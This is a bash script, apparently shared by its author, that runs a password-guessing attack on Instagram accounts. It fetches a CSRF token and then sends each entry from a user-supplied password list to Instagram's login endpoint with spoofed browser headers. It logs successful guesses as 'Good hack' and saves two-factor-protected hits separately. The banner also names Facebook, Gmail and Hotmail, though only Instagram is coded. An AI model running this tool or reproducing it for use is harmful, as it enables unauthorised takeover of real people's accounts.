!/bin/bash
echo "                                              "
echo "               BRUTE FORCE TOOL               "
echo "                                              "
echo "                                              "
echo "     ( -_•)╦̵̵̿╤─  B00M!!!          ¯\_(ツ)_/¯   "

echo "--------------------------------------------"
echo "  INSTAGRAM | FACEBOOK | GMAIL | HOTMAIL  "
echo "--------------------------------------------"


echo " ⠀⢠⣶⣿⣿⣗⡢⠀⠀⠀⠀⠀⠀⢤⣒⣿⣿⣷⣆   ⠀      ch^URL "
echo "⠀⠋⠉⠉⠙⠻⣿⣷⡄⠀⠀⠀⣴⣿⠿⠛⠉⠉⠉⠃⠀                "
echo "⠀⠀⢀⡠⢤⣠⣀⡹⡄⠀⠀⠀⡞⣁⣤⣠⠤⡀⠀⠀⠀                "
echo "⢐⡤⢾⣿⣿⢿⣿⡿⠀⠀⠀⠀⠸⣿⣿⢿⣿⣾⠦⣌⠀                "
echo "⠁⠀⠀⠀⠉⠈⠀⠀⣸⠀⠀⢰⡀⠀⠈⠈⠀⠀⠀⠀⠁                "
echo "⠀⠀⠀⠀⠀⠀⣀⡔⢹⠀⠀⢸⠳⡄⡀⠀⠀⠀⠀⠀⠀                "
echo "⠸⡦⣤⠤⠒⠋⠘⢠⡸⣀⣀⡸⣠⠘⠉⠓⠠⣤⢤⡞⠀                "
echo "⠀⢹⡜⢷⣄⠀⣀⣀⣾⡶⢶⣷⣄⣀⡀⢀⣴⢏⡾⠁⠀                "
echo "⠀⠀⠹⡮⡛⠛⠛⠻⠿⠥⠤⠽⠿⠛⠛⠛⣣⡾⠁⠀⠀                "
echo "⠀⠀⠀⠙⢄⠁⠀⠀⠀⣄⣀⡄⠀⠀⠀⢁⠞⠀⠀⠀⠀                "
echo "⠀⠀⠀⠀⠀⠂⠀⠀⠀⢸⣿⠀⠀⠀⠠⠂⠀⠀                 ⠀ "
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀                     "⠀⠀⠀⠀⠀
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀by> Mohammed Ryan     "⠀⠀⠀⠀⠀⠀
# Function to clear the terminal
cls() {
  clear
}

# Get username and password list from user
read -p "Enter username: " user
read -p "Enter password list file path: " combo
echo "----------------------------"

# Check if combo file exists
if [ ! -f "$combo" ]; then
  echo "Error: Password list file not found!"
  exit 1
fi

# Start brute force attack using threads
threads=()
countprox=0
while read -r password; do
  payload='{
    "username": "'"$user"'",
    "enc_password": "#PWD_INSTAGRAM_BROWSER:0:'$(date +%s)':'"$password"'",
    "queryParams": {},
    "optIntoOneTap": "false"
  }'

  curl_output=$(curl -s -c cookies.txt -b cookies.txt -H "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" -H "X-Requested-With: XMLHttpRequest" -H "Referer: https://www.instagram.com/accounts/login/" -H "x-csrftoken: $(grep -oP 'csrf_token":"\K[^"]+' <<< $(curl -s https://www.instagram.com/accounts/login/))" -d "$payload" "https://www.instagram.com/accounts/login/ajax/")

  echo -e "${user}:${password}\n----------------------------"

  if grep -q "authenticated\": true" <<< "$curl_output"; then
    echo "${user}:${password} --> Good hack"
    echo "${user}:${password}" >> good.txt
  elif grep -q "two_factor_required" <<< "$curl_output"; then
    echo "${user}:${password} --> Good, it needs to be checked"
    echo "${user}:${password}" >> results_NeedVerify.txt
  fi

  sleep 0.9

done < "$combo"

# Wait for all threads to finish
for thread in "${threads[@]}"; do
  wait "$thread"
done

echo "Brute force attack completed. Check 'good.txt' and 'results_NeedVerify.txt' for results."

